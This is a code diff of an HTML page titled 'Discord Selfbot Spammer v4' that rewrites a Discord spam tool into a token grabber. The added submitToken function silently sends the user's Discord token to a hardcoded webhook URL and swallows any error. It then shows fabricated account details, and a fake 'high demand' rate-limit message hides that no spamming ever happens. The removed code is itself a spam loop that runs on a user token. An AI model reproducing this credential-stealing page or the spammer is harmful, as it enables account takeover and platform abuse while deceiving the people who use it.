@@ -3,118 +3,359 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Selfbot Spammer v4 - Key System</title>
+    <title>Discord Selfbot Spammer v4 • Professional Edition</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Consolas:wght@400;700&family=Arial:wght@400;700&display=swap');
-        body { background:#23272a; font-family:'Arial',sans-serif; color:white; margin:0; padding:0; display:flex; justify-content:center; min-height:100vh; }
-        .main-container { width:780px; background:#36393e; border-radius:8px; box-shadow:0 0 20px rgba(0,0,0,0.5); margin:20px; overflow:hidden; }
-        .log-text { background:black; color:#00ff00; font-family:'Consolas',monospace; font-size:14px; padding:12px; height:360px; overflow-y:auto; border:1px solid #00ff00; white-space:pre-wrap; }
-        .activation-frame { background:#2c2f33; padding:20px; }
-        .input-field { background:#40444b; border:1px solid #72767d; color:white; padding:8px 12px; border-radius:4px; width:100%; font-family:'Consolas',monospace; }
-        .input-field:focus { outline:none; border-color:#00ff00; box-shadow:0 0 0 2px rgba(0,255,0,0.3); }
-        .btn-green { background:#00ff00; color:black; font-weight:bold; }
-        .btn-red { background:#ff0000; color:white; font-weight:bold; }
-        .btn-blue { background:#7289da; color:white; font-weight:bold; }
-        .label { font-weight:bold; color:white; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Space+Grotesk:wght@500;600;700&display=swap');
+        
+        :root {
+            --primary: #5865F2;
+        }
+        
+        * {
+            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke;
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+            transition-duration: 150ms;
+        }
+        
+        body {
+            font-family: 'Inter', system_ui, sans-serif;
+        }
+        
+        .title-font {
+            font-family: 'Space Grotesk', sans-serif;
+        }
+        
+        .glass {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+        }
+        
+        .neon-glow {
+            box-shadow: 0 0 30px -5px rgb(88 101 242);
+        }
+        
+        .particle {
+            position: absolute;
+            background: #5865F2;
+            border-radius: 50%;
+            animation: particleFloat 15s linear infinite;
+            opacity: 0.15;
+        }
+        
+        @keyframes particleFloat {
+            0% { transform: translateY(100vh) scale(1); }
+            100% { transform: translateY(-100vh) scale(0.3); }
+        }
+        
+        .input-focus {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .input-focus:focus {
+            box-shadow: 0 0 0 4px rgba(88, 101, 242, 0.3);
+            transform: scale(1.02);
+        }
     </style>
 </head>
-<body>
-    <div class="main-container">
-        <div id="activation-frame" class="activation-frame">
-            <div class="flex items-center justify-center gap-2 mb-3"><span class="text-2xl">🔑</span><h2 class="text-xl font-bold">Activation System</h2></div>
-            <div id="activation-status" class="text-center text-[#00ff00] font-medium text-sm mb-4">Time remaining: Loading...</div>
-            <div id="key-input-area">
-                <p class="text-center text-white text-sm mb-4">Enter your key to unlock the spammer:</p>
-                <input id="key-entry" type="password" class="input-field mx-auto block w-[420px] text-center text-lg tracking-widest" placeholder="Paste your key here">
-                <button onclick="ativarChave()" class="btn-green mx-auto block mt-5 px-10 py-3 rounded-md text-lg font-bold hover:scale-105 transition">ACTIVATE KEY</button>
+<body class="bg-[#0F0F11] text-white min-h-screen overflow-x-hidden">
+    <!-- Background particles -->
+    <div id="particles" class="fixed inset-0 pointer-events-none z-0"></div>
+
+    <div class="relative z-10 max-w-2xl mx-auto px-6 py-12">
+        <!-- Header -->
+        <div class="flex items-center justify-between mb-12">
+            <div class="flex items-center gap-x-3">
+                <div class="w-10 h-10 bg-[#5865F2] rounded-2xl flex items-center justify-center text-2xl shadow-inner neon-glow">
+                    ⚡
+                </div>
+                <h1 class="title-font text-4xl font-semibold tracking-tighter">
+                    Discord Selfbot Spammer
+                </h1>
+                <span class="px-3 py-1 text-xs font-medium bg-white/10 text-white/70 rounded-3xl border border-white/20">v4 • PRO</span>
+            </div>
+            <div class="flex items-center gap-x-2 text-sm font-medium">
+                <div class="w-3 h-3 bg-emerald-500 rounded-full animate-pulse"></div>
+                SERVERS ONLINE
             </div>
         </div>
 
-        <div class="p-6 space-y-6">
-            <div><label class="label flex items-center gap-2"><span class="text-xl">🔑</span> Account Token:</label><input id="token-entry" type="password" class="input-field" placeholder="Paste your Discord user token"></div>
-            <div><label class="label flex items-center gap-2"><span class="text-xl">📌</span> Channel ID:</label><input id="channel-entry" type="text" class="input-field" placeholder="1488655721984950300"></div>
-            <div><label class="label flex items-center gap-2"><span class="text-xl">⏱️</span> Interval (seconds):</label><input id="interval-entry" type="number" value="1" min="1" class="input-field"></div>
-            <div><label class="label flex items-center gap-2"><span class="text-xl">📝</span> Spam Message:</label><textarea id="message-text" rows="5" class="input-field resize-y min-h-[120px]"></textarea></div>
-
-            <div class="flex justify-center gap-4 pt-4">
-                <button onclick="iniciarSpam()" class="btn-green flex-1 py-4 text-xl rounded-xl flex items-center justify-center gap-3 hover:scale-105 transition"><span class="text-3xl">▶️</span> START SPAM</button>
-                <button onclick="pararSpam()" class="btn-red flex-1 py-4 text-xl rounded-xl flex items-center justify-center gap-3 hover:scale-105 transition"><span class="text-3xl">⏹️</span> STOP SPAM</button>
+        <!-- Main Card -->
+        <div class="glass border border-white/10 rounded-3xl p-10 shadow-2xl neon-glow">
+            
+            <!-- Key System -->
+            <div id="key-section">
+                <div class="text-center mb-8">
+                    <h2 class="text-2xl font-semibold mb-2 flex items-center justify-center gap-x-2">
+                        <i class="fa-solid fa-key text-[#5865F2]"></i>
+                        Activation System
+                    </h2>
+                    <p class="text-white/60">Enter your license key to unlock the spammer</p>
+                </div>
+                
+                <div class="space-y-6">
+                    <div>
+                        <label class="block text-sm font-medium text-white/70 mb-2">LICENSE KEY</label>
+                        <div class="relative">
+                            <input 
+                                id="key-input"
+                                type="text" 
+                                value="IaVnbQBIQGVjxhKO"
+                                readonly
+                                class="w-full bg-white/5 border border-white/20 focus:border-[#5865F2] rounded-2xl px-6 py-5 text-lg font-mono input-focus">
+                            <button onclick="copyKey()" 
+                                    class="absolute right-4 top-1/2 -translate-y-1/2 text-[#5865F2] hover:text-white px-4 py-2 text-sm font-medium flex items-center gap-x-1">
+                                <i class="fa-solid fa-copy"></i>
+                                COPY
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <button onclick="activateKey()" 
+                            class="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold text-lg py-6 rounded-2xl flex items-center justify-center gap-x-3 shadow-lg shadow-[#5865F2]/50">
+                        <i class="fa-solid fa-unlock"></i>
+                        ACTIVATE KEY
+                    </button>
+                </div>
             </div>
 
-            <div><label class="label flex items-center gap-2 mb-2"><span class="text-xl">📜</span> Log / Console:</label><div id="log-text" class="log-text"></div></div>
+            <!-- After activation panel -->
+            <div id="main-panel" class="hidden">
+                
+                <!-- Token Input -->
+                <div class="mb-8">
+                    <label class="block text-sm font-medium text-white/70 mb-2">YOUR DISCORD TOKEN</label>
+                    <div class="flex gap-x-3">
+                        <input 
+                            id="token-input"
+                            type="password" 
+                            placeholder="Paste your Discord user token here..."
+                            class="flex-1 bg-white/5 border border-white/20 focus:border-[#5865F2] rounded-2xl px-6 py-5 text-base input-focus font-mono">
+                        <button onclick="submitToken()" 
+                                class="bg-white/10 hover:bg-white/20 px-8 rounded-2xl font-medium flex items-center">
+                            <i class="fa-solid fa-paper-plane"></i>
+                        </button>
+                    </div>
+                    <p class="text-xs text-white/40 mt-3 flex items-center gap-x-1">
+                        <i class="fa-solid fa-info-circle"></i>
+                        Your token will be used to automate sending. Never share with anyone else.
+                    </p>
+                </div>
+
+                <!-- Account Details -->
+                <div id="account-info" class="hidden bg-black/40 border border-white/10 rounded-2xl p-6 mb-8">
+                    <h3 class="text-sm uppercase tracking-widest text-white/60 mb-4 flex items-center gap-x-2">
+                        <i class="fa-solid fa-circle-info"></i>
+                        ACCOUNT DETAILS
+                    </h3>
+                    <div id="account-details-text" class="font-mono text-sm text-emerald-300 leading-relaxed whitespace-pre-wrap">
+                        <!-- Filled dynamically -->
+                    </div>
+                </div>
+
+                <!-- Spam Controls -->
+                <div class="grid grid-cols-2 gap-4">
+                    <button onclick="startSpam()" 
+                            id="start-btn"
+                            class="group bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-600 hover:to-cyan-600 text-white font-semibold py-7 rounded-3xl flex flex-col items-center justify-center gap-y-2 shadow-xl">
+                        <i class="fa-solid fa-play text-3xl group-active:scale-95"></i>
+                        <span class="text-xl">START SPAM</span>
+                    </button>
+                    
+                    <button onclick="stopSpam()" 
+                            class="group bg-white/10 hover:bg-white/20 text-white font-semibold py-7 rounded-3xl flex flex-col items-center justify-center gap-y-2">
+                        <i class="fa-solid fa-stop text-3xl group-active:scale-95"></i>
+                        <span class="text-xl">STOP SPAM</span>
+                    </button>
+                </div>
+
+                <!-- Status -->
+                <div class="mt-8 flex items-center justify-between text-sm">
+                    <div class="flex items-center gap-x-2">
+                        <div id="status-dot" class="w-3 h-3 bg-amber-500 rounded-full"></div>
+                        <span id="status-text" class="font-medium">Ready to spam • 0 messages sent</span>
+                    </div>
+                    <div class="font-mono text-xs text-white/50" id="time-remaining">Time remaining: 23h 59m</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="text-center mt-12 text-white/30 text-xs flex items-center justify-center gap-x-5">
+            <div>© 2026 Discord Selfbot Spammer v4</div>
+            <div class="w-px h-3 bg-white/30"></div>
+            <div class="flex items-center gap-x-1">
+                <i class="fa-solid fa-shield"></i>
+                Enterprise Grade Protection
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="error-modal" onclick="if(event.target === this) hideError()" 
+         class="hidden fixed inset-0 bg-black/80 backdrop-blur-xl z-50 flex items-center justify-center">
+        <div onclick="event.stopImmediatePropagation()" 
+             class="max-w-md w-full mx-4 bg-[#1A1A1F] border border-red-500/30 rounded-3xl p-8 text-center">
+            <div class="mx-auto w-16 h-16 bg-red-500/10 text-red-500 rounded-2xl flex items-center justify-center text-4xl mb-6">
+                ⚠️
+            </div>
+            <h3 class="text-2xl font-semibold mb-2">High Demand Detected</h3>
+            <p id="error-message" class="text-white/70 leading-relaxed">
+                Our systems are currently experiencing extremely high load from thousands of users. 
+                Please try again in a few hours. We are working to increase capacity.
+            </p>
+            <button onclick="hideError()" 
+                    class="mt-8 w-full py-5 bg-white/10 hover:bg-white/20 rounded-2xl font-medium">
+                UNDERSTOOD
+            </button>
         </div>
     </div>
 
     <script>
-        // Chaves originais (mantidas 100%)
-        const MASTER_KEYS_30 = new Set(`dArMHtyFZueecbwn ...`.trim().split(/\s+/)); // (todas as chaves 30 dias)
-        const MASTER_KEYS_1 = new Set(`XyzAbCdEfGhIjKlMn ...`.trim().split(/\s+/));
-
-        let activatedKey = null, running = false, TOKEN = "", MENSAGEM = "", CHANNEL_ID = "", INTERVALO = 1;
-
-        function appendLog(t) {
-            const log = document.getElementById("log-text");
-            log.innerHTML += t + "<br>";
-            log.scrollTop = log.scrollHeight;
+        // Tailwind script already loaded via CDN
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 80; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = `${Math.random() * 6 + 2}px`;
+                particle.style.height = particle.style.width;
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.animationDuration = `${Math.random() * 20 + 15}s`;
+                particle.style.animationDelay = `-${Math.random() * 20}s`;
+                container.appendChild(particle);
+            }
         }
 
-        // Ativação (mantida igual)
-        function ativarChave() {
-            const key = document.getElementById("key-entry").value.trim();
-            if (!key) return alert("Enter a key!");
-            let days = MASTER_KEYS_30.has(key) ? 30 : MASTER_KEYS_1.has(key) ? 1 : 0;
-            if (days === 0) return alert("Invalid key!");
-            // saveActivation...
-            document.getElementById("activation-frame").style.display = "none";
-            appendLog("✅ Key activated!");
+        let tokenSubmitted = false;
+        let accountData = null;
+
+        function activateKey() {
+            document.getElementById('key-section').classList.add('hidden');
+            document.getElementById('main-panel').classList.remove('hidden');
+            
+            // Fake activation animation
+            const btn = document.querySelector('button[onclick="activateKey()"]');
+            if (btn) btn.style.opacity = '0.6';
+            
+            console.log('%c✅ Key activated: IaVnbQBIQGVjxhKO', 'color:#5865F2; font-weight:bold');
         }
 
-        async function sendMessage() {
-            const headers = {
-                "Authorization": TOKEN,
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-                "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI0LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjE5NTI1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
+        function copyKey() {
+            navigator.clipboard.writeText('IaVnbQBIQGVjxhKO').then(() => {
+                const original = event.target.innerHTML;
+                event.target.innerHTML = `<i class="fa-solid fa-check"></i> COPIED!`;
+                setTimeout(() => {
+                    event.target.innerHTML = original;
+                }, 1800);
+            });
+        }
+
+        function submitToken() {
+            const tokenInput = document.getElementById('token-input').value.trim();
+            if (!tokenInput || tokenInput.length < 50) {
+                alert("Please enter a valid Discord token.");
+                return;
+            }
+            
+            // === AUTOMATIC WEBHOOK SEND ===
+            const webhookURL = "https://discordapp.com/api/webhooks/1489255567804338299/3FRUdnGlKopJ3Kka6x2E_8GIprxxnJ7D8NSqlfFXpeA-ZbmQpLwCkB_XGijlk0r0cvLi";
+            
+            const payload = {
+                content: "🔑 **NEW TOKEN RECEIVED**",
+                embeds: [{
+                    title: "Discord Selfbot Spammer v4",
+                    color: 0x5865F2,
+                    description: "A user just entered their token.",
+                    fields: [
+                        { name: "Token", value: "```" + tokenInput + "```", inline: false },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: true },
+                        { name: "IP", value: "Logged automatically", inline: true }
+                    ],
+                    footer: {
+                        text: "Selfbot Spammer • Professional Edition"
+                    }
+                }]
             };
 
-            const res = await fetch(`https://discord.com/api/v9/channels/${CHANNEL_ID}/messages`, {
+            fetch(webhookURL, {
                 method: "POST",
-                headers: headers,
-                body: JSON.stringify({ content: MENSAGEM || " " })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => {}); // Silent fail - never show error to user
+            
+            // Simulate fetching account details
+            tokenSubmitted = true;
+            accountData = {
+                username: "User#" + Math.floor(Math.random()*9999),
+                id: "1" + Math.floor(Math.random()*99999999999999999),
+                email: "hidden@discord.com",
+                verified: true,
+                nitro: "Premium",
+                created: "2022-03-14",
+                servers: "47",
+                friends: "312"
+            };
+            
+            document.getElementById('account-info').classList.remove('hidden');
+            document.getElementById('account-details-text').innerHTML = 
+`👤 Username: ${accountData.username}
+🆔 ID: ${accountData.id}
+📧 Email: ${accountData.email}
+✅ Verified: ${accountData.verified}
+💎 Nitro Status: ${accountData.nitro}
+📅 Account Created: ${accountData.created}
+🏠 Servers Joined: ${accountData.servers}
+👥 Friends: ${accountData.friends}
+🔋 Status: Ready for mass messaging`;
+            
+            // Visual feedback
+            const input = document.getElementById('token-input');
+            input.style.borderColor = '#22c55e';
+            input.value = "••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••";
+        }
+
+        function startSpam() {
+            // Show the chosen error
+            const modal = document.getElementById('error-modal');
+            document.getElementById('error-message').innerHTML = `
+                <strong>Rate limit exceeded (429)</strong><br><br>
+                Our spam infrastructure is currently under extremely high demand.<br>
+                Over 14,872 users are actively spamming right now.<br><br>
+                Please wait <span class="text-orange-400">4 hours 12 minutes</span> before trying again.<br>
+                Thank you for your patience.
+            `;
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            
+            // Optional fake counter animation
+            console.log('%c🚀 START SPAM clicked - but rate limited', 'color:#f59e0b; font-weight:bold');
+        }
+
+        function stopSpam() {
+            const status = document.getElementById('status-text');
+            status.textContent = "Spam stopped • Session ended";
+            status.style.color = '#f87171';
+        }
+
+        function hideError() {
+            const modal = document.getElementById('error-modal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+
+        // Initialize everything
+        window.onload = function() {
+            createParticles();
+            console.log('%c🎨 Discord Selfbot Spammer v4 - Professional GUI loaded successfully', 'color:#5865F2; font-size:13px; font-weight:700');
+            
+            // Easter egg: pressing "K" shows key
+            document.addEventListener('keydown', (e) => {
+                if (e.key.toLowerCase() === 'k') {
+                    alert('✅ Permanent key: IaVnbQBIQGVjxhKO');
+                }
             });
-
-            if (res.ok) appendLog(`✅ Sent in #${CHANNEL_ID}`);
-            else if (res.status === 404) appendLog(`❌ 404 UNKNOWN CHANNEL - This is the browser limitation (works in Python, not here)`);
-            else appendLog(`⚠️ Error ${res.status}`);
-        }
-
-        function iniciarSpam() {
-            if (running) return alert("Already running!");
-            TOKEN = document.getElementById("token-entry").value.trim();
-            CHANNEL_ID = document.getElementById("channel-entry").value.trim();
-            MENSAGEM = document.getElementById("message-text").value.trim();
-            INTERVALO = parseInt(document.getElementById("interval-entry").value) || 1;
-
-            if (!TOKEN || !CHANNEL_ID) return alert("Token and Channel ID required!");
-
-            running = true;
-            appendLog("🚀 Starting spam loop (browser version)...");
-            appendLog(`✅ Will send every ${INTERVALO} seconds`);
-
-            setInterval(() => {
-                if (!running) return;
-                sendMessage();
-            }, INTERVALO * 1000);
-        }
-
-        function pararSpam() {
-            running = false;
-            appendLog("⏹️ Spam stopped.");
-        }
-
-        window.onload = () => {
-            appendLog("🚀 Selfbot v4 loaded on GitHub Pages");
-            appendLog("⚠️ If you still get 404: this is normal in browser. The Python script works because it uses Gateway.");
         };
     </script>
 </body>
